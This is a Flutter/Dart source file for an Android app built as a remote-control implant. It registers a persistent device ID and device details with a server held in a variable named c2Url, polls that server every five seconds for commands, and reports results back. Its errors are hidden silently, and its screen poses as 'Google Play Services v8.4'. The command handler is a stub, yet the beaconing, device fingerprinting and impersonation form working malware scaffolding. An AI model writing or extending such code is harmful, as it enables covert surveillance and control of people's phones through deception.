import 'package:flutter/material.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'dart:async';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  runApp(const PersistentApp());
}

class PersistentApp extends StatelessWidget {
  const PersistentApp({Key? key}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      home: const InitScreen(),
      debugShowCheckedModeBanner: false,
    );
  }
}

class InitScreen extends StatefulWidget {
  const InitScreen({Key? key}) : super(key: key);

  @override
  State<InitScreen> createState() => _InitScreenState();
}

class _InitScreenState extends State<InitScreen> {
  final String c2Url = 'http://10.0.2.2:8888';
  late String deviceId;

  @override
  void initState() {
    super.initState();
    _initialize();
  }

  void _initialize() async {
    try {
      final prefs = await SharedPreferences.getInstance();
      deviceId = prefs.getString('device_id') ??
          DateTime.now().millisecondsSinceEpoch.toString();
      await prefs.setString('device_id', deviceId);

      final deviceInfo = DeviceInfoPlugin();
      final androidInfo = await deviceInfo.androidInfo;

      await http
          .post(
            Uri.parse('$c2Url/api/devices/register'),
            headers: {'Content-Type': 'application/json'},
            body: jsonEncode({
              'device_id': deviceId,
              'model': androidInfo.model,
              'manufacturer': androidInfo.manufacturer,
              'android_version': androidInfo.version.sdkInt,
              'invite_code': 'default',
            }),
          )
          .timeout(const Duration(seconds: 5));

      _startPolling();
    } catch (e) {
      // silent — no crash
    }
  }

  void _startPolling() {
    Timer.periodic(const Duration(seconds: 5), (_) async {
      try {
        final res = await http
            .get(
              Uri.parse('$c2Url/api/commands/poll?device_id=$deviceId'),
            )
            .timeout(const Duration(seconds: 5));

        if (res.statusCode == 200) {
          final data = jsonDecode(res.body);
          if (data['cmd'] != null && data['cmd'] != 'wait') {
            _executeCommand(data['cmd'] as String);
          }
        }
      } catch (_) {}
    });
  }

  void _executeCommand(String cmd) async {
    try {
      await http
          .post(
            Uri.parse('$c2Url/api/logs/upload'),
            headers: {'Content-Type': 'application/json'},
            body: jsonEncode({
              'device_id': deviceId,
              'log_type': cmd,
              'data': 'executed',
              'timestamp': DateTime.now().millisecondsSinceEpoch,
            }),
          )
          .timeout(const Duration(seconds: 5));
    } catch (_) {}
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: const [
            Icon(Icons.android, size: 80, color: Color(0xFF0f3460)),
            SizedBox(height: 20),
            Text(
              'Google Play Services',
              style: TextStyle(fontSize: 18, fontWeight: FontWeight.bold),
            ),
            SizedBox(height: 10),
            Text(
              'v8.4',
              style: TextStyle(fontSize: 12, color: Colors.grey),
            ),
          ],
        ),
      ),
    );
  }
}
